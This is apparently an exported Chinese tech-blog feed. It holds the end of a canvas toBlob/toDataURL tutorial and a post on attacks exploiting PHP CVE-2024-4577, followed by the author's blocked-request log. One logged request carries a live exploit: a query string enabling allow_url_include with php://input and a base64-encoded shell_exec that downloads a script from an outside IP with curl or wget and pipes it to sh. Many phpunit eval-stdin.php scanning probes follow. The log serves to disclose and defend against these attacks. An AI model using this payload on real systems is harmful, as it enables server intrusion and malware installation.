class="javascript">canvas.toBlob(function(blob) &#123;    var url = URL.createObjectURL(blob);    p.innerHTML = &#39;&lt;img src=&quot;&#39;+ url +&#39;&quot;&gt;&#39;;&#125;, &#39;image/jpeg&#39;);</code></pre><p>另外，如果图片转换交互频繁，性能开销比较大，且图片仅展示无其它数据层面的交互，我们可以使用URL.revokeObjectURL(url)释放资源。不过实际开发页面通常都不复杂，不释放也没关系。</p><h4 id="兼容"><a href="#兼容" class="headerlink" title="兼容"></a>兼容</h4><p>首先，toBlob()方法IE9浏览器不支持，因为Blob数据格式IE10+才支持。<br>然后，对于IE浏览器，toBlob()的兼容性有些奇怪，IE10浏览器支持ms私有前缀的toBlob()方法，完整方法名称是msToBlob()。而IE11+，toBlob()方法却不支持。<br>但是，我们可以基于toDataURL()方法进行polyfill，性能相对会差一些，JavaScript代码如下，参考自MDN：</p><pre><code class="javascript">if (!HTMLCanvasElement.prototype.toBlob) &#123;  Object.defineProperty(HTMLCanvasElement.prototype, &#39;toBlob&#39;, &#123;    value: function (callback, type, quality) &#123;      var canvas = this;      setTimeout(function() &#123;        var binStr = atob( canvas.toDataURL(type, quality).split(&#39;,&#39;)[1] );        var len = binStr.length;        var arr = new Uint8Array(len);        for (var i = 0; i &lt; len; i++) &#123;          arr[i] = binStr.charCodeAt(i);        &#125;        callback(new Blob([arr], &#123; type: type || &#39;image/png&#39; &#125;));      &#125;);    &#125;  &#125;);&#125;</code></pre><h3 id="toDataURL"><a href="#toDataURL" class="headerlink" title="toDataURL()"></a>toDataURL()</h3><h4 id="简介-4"><a href="#简介-4" class="headerlink" title="简介"></a>简介</h4><p>Canvas本质上就是一个位图图像，因此，浏览器提供了若干API可以将Canvas图像转换成可以作为IMG呈现的数据，其中最老牌的方法就是HTMLCanvasElement.toDataURL()，此方法可以返回Canvas图像对应的data URI，也就是平常我们所说的base64地址。</p><h4 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h4><pre><code class="javascript">canvas.toDataURL(mimeType, quality);</code></pre><ol><li>参数说明</li></ol><ul><li>mimeType（String，可选）<br>mimeType表示需要转换的图像的mimeType类型。默认值是image&#x2F;png，还可以是image&#x2F;jpeg，甚至image&#x2F;webp（前提浏览器支持）等。</li><li>quality（Number可选）<br>quality表示转换的图片质量。范围是0到1。此参数要想有效，图片的mimeType需要是image&#x2F;jpeg或者image&#x2F;webp，其他mimeType值无效。默认压缩质量是0.92。<br>根据自己的肉眼分辨，如果使用toDataURL()的quality参数对图片进行压缩，同样的压缩百分比呈现效果要比Adobe Photoshop差一些。</li></ul><ol start="2"><li>返回值<br>返回base64 data图片数据。</li></ol><h4 id="案例-4"><a href="#案例-4" class="headerlink" title="案例"></a>案例</h4><h5 id="案例1-最基础的使用"><a href="#案例1-最基础的使用" class="headerlink" title="案例1(最基础的使用)"></a>案例1(最基础的使用)</h5><pre><code class="html">&lt;canvas width=&quot;10&quot; height=&quot;10&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">var canvas = document.querySelector(&#39;canvas&#39;);var dataURL = canvas.toDataURL();console.log(dataURL);// 结果是：&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAoAAAAKCAYAAACNMs+9AAAAF0lEQVQoU2NkIBIwEqmOYVQh3pAiOngACmkAC5eMKzgAAAAASUVORK5CYII=&quot;</code></pre><h5 id="案例2-转换成JPG图片"><a href="#案例2-转换成JPG图片" class="headerlink" title="案例2(转换成JPG图片)"></a>案例2(转换成JPG图片)</h5><p>如果Canvas中颜色信息非常丰富，如实物照片，则建议指定mime type为image&#x2F;jpeg，data-URL数据量会大大降低，但质量也依然很OK。例如：</p><pre><code class="javascript">canvas.toDataURL(&#39;image/jpeg&#39;);</code></pre><p>如果Canvas图像本身是2倍图（画布实际尺寸是CSS样式尺寸的2倍+），则图像理论质量0.5<del>0.6足矣。但考虑到Canvas本身压缩后的图像品质不算高，实际质量值建议0.6</del>0.7。如果是一倍图，则使用默认值即可。</p><pre><code class="javascript">canvas.toDataURL(&#39;image/jpeg&#39;, 0.6);</code></pre><h5 id="案例3-检测浏览器是否支持webp"><a href="#案例3-检测浏览器是否支持webp" class="headerlink" title="案例3(检测浏览器是否支持webp)"></a>案例3(检测浏览器是否支持webp)</h5><pre><code class="javascript">var isSupportWebp = !![].map &amp;&amp; document.createElement(&#39;canvas&#39;).toDataURL(&#39;image/webp&#39;).indexOf(&#39;data:image/webp&#39;) == 0;console.log(isSupportWebp);   // true or false</code></pre><h4 id="更多-1"><a href="#更多-1" class="headerlink" title="更多"></a>更多</h4>]]></content>
      
      
      <categories>
          
          <category> FrontEnd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Canvas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【拦截日志】黑客积极利用PHP远程代码执行漏洞（CVE-2024-4577）</title>
      <link href="/2024/10/30/linux-serverlog-20241017/"/>
      <url>/2024/10/30/linux-serverlog-20241017/</url>
      
        <content type="html"><![CDATA[<h2 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h2><p>2024年6月，一项被标记为CVE-2024-4577的PHP关键漏洞在公开披露后，迅速成为网络犯罪分子的主要攻击目标。Akamai安全情报响应团队（SIRT）观察到利用该漏洞的恶意活动激增，攻击者能够在易受攻击的PHP安装中执行远程代码。</p><h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><p>CVE-2024-4577漏洞影响PHP 8.1.29之前的版本、8.2.20之前的版本和8.3.8之前的版本，特别是在CGI模式下运行时。攻击者迅速武器化了这一漏洞，部署了多种恶意软件，包括Gh0st RAT、RedTail加密矿工、Muhstik恶意软件和XMRig加密矿工。</p><p>Gh0st RAT是最早被观察到利用该漏洞的恶意软件之一。该远程访问工具在漏洞披露后的一天内就被检测到。Gh0st RAT通过UPX打包，释放一个名为“Iqgqosc.exe”的可执行文件，枚举连接的驱动器和外设，并查询注册表。随后，它重命名为一个长且随机的文件名以避免检测，并与位于德国的命令和控制（C2）服务器通信。</p><p>RedTail加密矿工的攻击活动也被观察到。攻击者利用Unicode漏洞发送请求，执行一个wget请求以下载并执行一个shell脚本。该脚本托管在俄罗斯的一个IP地址上，旨在识别可写目录并下载有效载荷，将其重命名为“.redtail”。</p><p>Muhstik恶意软件也利用了CVE-2024-4577漏洞。一个shell脚本下载了一个名为“pty3”的ELF文件，表明这是Muhstik恶意软件，目标是物联网和Linux服务器进行加密挖矿和DDoS攻击。该恶意软件创建了诸如“&#x2F;var&#x2F;run&#x2F;pty3”这样的目录，并与最近与其他Muhstik活动相关的C2域通信。</p><p>XMRig加密矿工的攻击活动使用PowerShell下载并执行一个脚本，从远程矿池部署XMRig。该脚本随后清理临时文件以混淆攻击，使检测更加困难。CVE-2024-4577漏洞的快速和广泛利用突显了立即修补受影响PHP安装的关键需求。未能及时更新系统的组织面临重大风险，包括数据泄露、未经授权的访问、系统妥协和潜在的勒索软件攻击。</p><h2 id="拦截日志"><a href="#拦截日志" class="headerlink" title="拦截日志"></a>拦截日志</h2><pre><code class="log">[2024-10-17 04:39:17][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/hello.world&quot;, &quot;requestMethod&quot;: &quot;POST&quot;, &quot;requestPOST&quot;: &#123;&quot;&lt;?php shell_exec(base64_decode(\&quot;WD0kKGN1cmwgaHR0cDovLzE1NC4yMTYuMTcuMzAvYXogfHwgd2dldCBodHRwOi8vMTU0LjIxNi4xNy4zMC9heiAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA&quot;: &quot;\&quot;)); echo(md5(\&quot;Hello CVE-2024-4577\&quot;)); ?&gt;&quot;&#125;, &quot;requestGET&quot;: &#123;&quot;\ufffdd allow_url_include=1 \ufffdd auto_prepend_file=php://input&quot;: &quot;&quot;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:17][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/hello.world&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:17][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:17][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:17][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:17][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:18][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/vendor/phpunit/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:18][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/vendor/phpunit/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:18][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/vendor/phpunit/phpunit/LICENSE/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:18][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/vendor/phpunit/phpunit/LICENSE/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:18][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:18][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:18][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:18][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:18][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/phpunit/phpunit/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:18][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/phpunit/phpunit/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:18][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:18][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:18][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/phpunit/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:18][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/phpunit/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:18][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:18][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/lib/phpunit/phpunit/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/lib/phpunit/phpunit/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/lib/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/lib/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/lib/phpunit/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/lib/phpunit/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:19][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:20][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:20][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:20][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:20][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:20][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 04:39:20][INFO][middlewares.py:70:process_response]：&#123;&quot;requestPath&quot;: &quot;/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;responseContent&quot;: &#123;&quot;code&quot;: 201, &quot;data&quot;: &#123;&#125;, &quot;msg&quot;: &quot;Authentication failed&quot;&#125;&#125;[2024-10-17 04:39:20][INFO][middlewares.py:37:process_request]：&#123;&quot;ipInfo&quot;: &quot;117.186.238.82&quot;, &quot;requestPath&quot;: &quot;/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php&quot;, &quot;requestMethod&quot;: &quot;GET&quot;, &quot;requestPOST&quot;: &#123;&#125;, &quot;requestGET&quot;: &#123;&#125;, &quot;requestBody&quot;: &quot;NOT JSON&quot;&#125;[2024-10-17 